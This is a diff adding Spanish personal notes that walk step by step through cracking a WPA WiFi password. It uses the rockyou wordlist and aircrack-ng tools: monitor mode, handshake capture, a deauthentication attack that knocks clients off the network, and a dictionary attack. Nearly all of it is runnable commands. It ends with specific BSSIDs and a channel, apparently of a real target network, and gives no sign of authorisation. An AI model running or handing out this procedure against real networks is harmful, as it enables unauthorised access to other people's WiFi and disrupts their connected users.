@@ -1,0 +1,34 @@
+descargar rockyou
+sudo apt install aircrack-ng
+
+1) Poner la antena en modo monitor
+	a) ifconfig (sudo apt install net-tools) Ejecutar este comando sino detecta el comando ifconfig
+	###Una vez aparezca la informacion,tiene que aparecer algo parecido a 
+	"wlp1s0"
+	
+	b) sudo airmon-ng start wlp1s0
+	c)Comprobar que la red esta en modo monitor
+		"wlp1s0mon"
+	c) Enumerar las redes wifi disponibles
+		sudo airodump-ng wlp1s0mon
+		* Copiar el BSSID y memorizar el canal de la red Wifi
+	d) sudo airodump-ng -c  <Numero del canal> --bssid <NUMERO_DEL_BSSID_DE_LA_RED> auditoria wlp1s0mon 
+		* Esperar a que algun cliente navege utilizando esta red wifi
+
+	e)Fijarse en la Stacion y copiar el BSSID
+		* Ejecutar en otra terminal
+			sudo aireplay-ng -0 9 -a <BSSID> -c <BSSID DE LA ESTACION> <nombre de la interfaz de red (wlp1s0mon)>
+	f) Una vez se genere el handshake se deberian generar archivos en la carpeta
+
+	g)EJecutar 
+		* sudo aircrack-ng -b <BSSID_handshake> -w rockyou.txt <nombre.cap>
+
+		64:70:02:A0:56:64 channel 9
+
+		A4:4E:31:85:3A:F8
+
+
+		64:70:02:A0:56:64 
+
+
+		sudo airmon-ng stop wlp1s0mon
